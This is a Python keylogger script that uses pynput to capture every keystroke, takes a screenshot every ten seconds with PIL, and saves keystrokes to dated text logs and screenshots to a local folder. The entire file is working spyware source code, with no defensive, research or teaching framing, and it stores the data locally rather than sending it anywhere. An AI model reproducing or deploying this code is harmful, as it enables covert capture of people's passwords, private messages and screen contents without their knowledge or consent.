from pynput.keyboard import Key,Listener
from datetime import datetime
from pynput import keyboard
import threading
import time
from PIL import ImageGrab
import os
time_interval=10
text=""
def store_data():
    timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    l="["+timestamp+"]:"+text
    if text!="":
        write_1(str(l))
        print("change")
    else:
        print("not change")
    
    screenshot = ImageGrab.grab()
    file_name = time.strftime("%d_%m_%Y_%H_%M_%S") + ".png"
    folder_name = time.strftime("%d-%m-%Y")
    path=f"F:\deskbackup\keylogger\img\{folder_name}"
    # Save the screenshot as an image file
    if not os.path.exists(path):
    # Create the folder
        os.mkdir(path)
    else:
        path+="\\"
    screenshot.save(str(path)+file_name)
    timer = threading.Timer(time_interval,store_data)
    timer.start()
def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        text+=" [shift] "
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l:
        text+=" [Ctrl-L] "
    elif  key == keyboard.Key.ctrl_r:
        text+=" [Ctrl-R] "
    elif str(key) == "<96>":
        text+="0"
    
    elif str(key) == "<97>":
        text+="1"
    elif str(key) == "<98>":
        text+="2"
    elif str(key) == "<99>":
        text+="3"
    elif str(key) == "<100>":
        text+="4"
    elif str(key) == "<101>":
        text+="5"
    elif str(key) == "<102>":
        text+="6"
    elif str(key) == "<103>":
        text+="7"
    elif str(key) == "<104>":
        text+="8"
    elif str(key) == "<105>":
        text+="9"
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")
        
def write_1(var):
    current_date = datetime.now().strftime("%d_%m_%Y")
    file_name = current_date + "_log.txt"
    with open("txtlogging/"+file_name, "a") as f:
        f.write("\n"+var)
        global text
        text = ""
with Listener(on_press=on_press) as listener:
    store_data()
    listener.join()
